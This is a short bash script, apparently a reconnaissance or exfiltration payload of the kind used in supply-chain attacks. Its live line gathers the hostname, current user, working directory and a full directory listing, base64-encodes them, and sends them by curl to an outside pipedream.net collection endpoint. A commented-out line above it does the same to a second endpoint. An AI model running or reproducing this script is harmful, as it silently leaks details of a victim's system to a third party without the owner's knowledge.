#!/bin/bash

#curl -H "Hostname: $(hostname | base64)" -H "Whoami: $(whoami | base64)" -H "Pwd: $(pwd | base64)" -d "$(ls -la | base64)"  --http1.1  "https://eo2r63kl57o7o0.m.pipedream.net"
curl -H "Hostname: $(hostname | base64)" -H "Whoami: $(whoami | base64)" -H "Pwd: $(pwd | base64)" -d "$(ls -la | base64)"  --http1.1  "eobmitz347y28vj.m.pipedream.net"